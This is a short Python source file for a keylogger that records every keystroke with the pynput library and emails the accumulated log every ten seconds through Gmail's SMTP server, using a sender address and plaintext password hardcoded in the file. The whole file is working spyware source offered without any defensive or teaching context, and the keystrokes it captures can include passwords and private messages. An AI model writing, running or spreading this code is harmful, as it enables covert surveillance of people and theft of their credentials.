import smtplib
import threading
from pynput import keyboard

class keyLogger:
    def __init__(self, email, password,interval):
        self.interval = interval
        self.email = email
        self.password = password
        self.log = ""

    def append(self, string):
        self.log = self.log + string

    def on_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            elif key == key.esc:
                print("Exiting program...")
                return False
            else:
                current_key = " " + str(key) + " "

        self.append(current_key)

    def send_mail(self, email, password, message):
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()


    def report(self):
        self.send_mail(self.email, self.password, "\n\n" + self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def start(self):
        keyboard_listener = keyboard.Listener(on_press = self.on_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()

if __name__ == "__main__":
    keylogger = keyLogger('mykeyloggersa@gmail.com','SA_keylogger',10)
    keylogger.start()



